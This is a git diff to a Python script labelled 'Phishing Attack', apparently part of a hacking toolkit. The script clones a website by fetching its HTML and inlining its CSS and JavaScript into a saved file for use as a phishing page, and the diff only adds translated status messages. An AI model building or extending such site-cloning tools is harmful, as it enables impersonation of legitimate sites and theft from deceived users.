@@ -1,5 +1,11 @@
 from Config.Util import *
 from Config.Config import *
+from Config.Translates import *
+
+current_language = LANGUAGE
+
+def tr(key):
+    return translations[current_language].get(key, key)
 
 try:
     import os
@@ -14,7 +20,7 @@ Title("Phishing Attack")
 
 try:
     Slow(phishing_banner)
-    website_url = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Website Url -> {reset}")
+    website_url = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} {tr('Website_url')} -> {reset}")
     Censored(website_url)
     if "https://" not in website_url and "http://" not in website_url:
         website_url = "https://" + website_url
@@ -22,7 +28,7 @@ try:
     def css_and_js(html_content, base_url):
         soup = BeautifulSoup(html_content, 'html.parser')
 
-        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Css recovery..")
+        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} {tr('CssRecovery')}")
         css_links = soup.find_all('link', rel='stylesheet')
         all_css = ""
 
@@ -33,9 +39,9 @@ try:
                 if css_response.status_code == 200:
                     all_css += css_response.text + "\n"
                 else:
-                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error retrieving css.")
+                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorCss')}")
             except:
-                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error retrieving css.")
+                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorCss')}")
         
         if all_css:
             style_tag = soup.new_tag('style')
@@ -44,7 +50,7 @@ try:
             for link in css_links:
                 link.decompose()
 
-        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Javascript recovery..")
+        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} {tr('JSRecovery')}")
         script_links = soup.find_all('script', src=True)
         all_js = ""
 
@@ -55,9 +61,9 @@ try:
                 if js_response.status_code == 200:
                     all_js += js_response.text + "\n"
                 else:
-                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error retrieving javascript.")
+                    print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorJS')}")
             except:
-                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error retrieving javascript.")
+                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {tr('ErrorJS')}")
         
         if all_js:
             script_tag = soup.new_tag('script')
@@ -68,7 +74,7 @@ try:
 
         return soup.prettify()
 
-    print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Html recovery..")
+    print(f"\n{BEFORE + current_time_hour() + AFTER} {WAIT} {tr('HTMLRecovery')}")
     response = requests.get(website_url, timeout=5)
     if response.status_code == 200:
         html_content = response.text
@@ -82,7 +88,7 @@ try:
 
         with open(file_html, 'w', encoding='utf-8') as file:
             file.write(final_html)
-        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Phishing attack successful. The file is located in the folder \"{secondary}{file_html_relative}{invalid}\"")
+        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} {tr('PhishingSucces')} \"{secondary}{file_html_relative}{primary}\"")
         Continue()
         Reset()
     else:
